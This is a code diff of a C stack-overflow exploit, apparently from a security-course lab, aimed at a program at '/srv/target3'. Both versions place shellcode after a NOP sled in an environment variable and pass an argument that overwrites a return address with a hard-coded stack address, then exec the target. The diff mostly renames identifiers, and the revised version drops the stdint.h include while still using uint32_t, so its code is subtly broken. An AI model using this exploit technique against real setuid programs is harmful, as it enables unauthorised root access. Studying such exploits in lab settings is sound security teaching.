@@ -1,46 +1,39 @@
 #include <stdio.h>
-#include <stdint.h>
-#include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
 #include "shellcode.h"
 
-#define TARGET "/srv/target3"
-#define ENV_SIZE 400
-#define NOP_SIZE 201
-#define BASE_ADDR 0xffffdec0
-#define RET_OFFSET 4
+#define TGT "/srv/target3"
+#define ESZ 400
+#define NSZ 201
+#define BADDR 0xffffdec0
+#define ROFF 4
 
-void craftEnv(char *e) {
-    memset(e, 0x90, ENV_SIZE - 1);
-    *((uint32_t *)(e)) = BASE_ADDR + RET_OFFSET;
-    *((uint32_t *)(e + RET_OFFSET)) = BASE_ADDR + 2 * RET_OFFSET;
-    memcpy(e + NOP_SIZE, shellcode, sizeof(shellcode));
-    e[ENV_SIZE - 1] = '\0';
+void mkenv(char *e) {
+    memset(e, 0x90, ESZ - 1);
+    *((uint32_t *)(e)) = BADDR + ROFF;
+    *((uint32_t *)(e + ROFF)) = BADDR + 2 * ROFF;
+    memcpy(e + NSZ, shellcode, sizeof(shellcode));
+    e[ESZ - 1] = 0;
 }
 
-int main(void) {
-    char *argv[3];
-    char *envp[2];
-    char env[ENV_SIZE];
-    char pad[20] = {0};
-
-    craftEnv(env);
-
-    for (int i = 0; i < 16; i++) {
-        pad[i] = 0x90;
-    }
-    *((uint32_t *)(pad + 16)) = BASE_ADDR;
-
-    argv[0] = TARGET;
-    argv[1] = pad;
-    argv[2] = NULL;
-
-    envp[0] = env;
-    envp[1] = NULL;
-
-    execve(TARGET, argv, envp);
-    fprintf(stderr, "execve failed.\n");
-
+int main() {
+    char *a[3], *e[2], env[ESZ], p[20] = {0};
+    
+    mkenv(env);
+    
+    memset(p, 0x90, 16);
+    *((uint32_t *)(p + 16)) = BADDR;
+    
+    a[0] = TGT;
+    a[1] = p;
+    a[2] = 0;
+    
+    e[0] = env;
+    e[1] = 0;
+    
+    execve(TGT, a, e);
+    write(2, "execve failed.\n", 15);
+    
     return 0;
 }
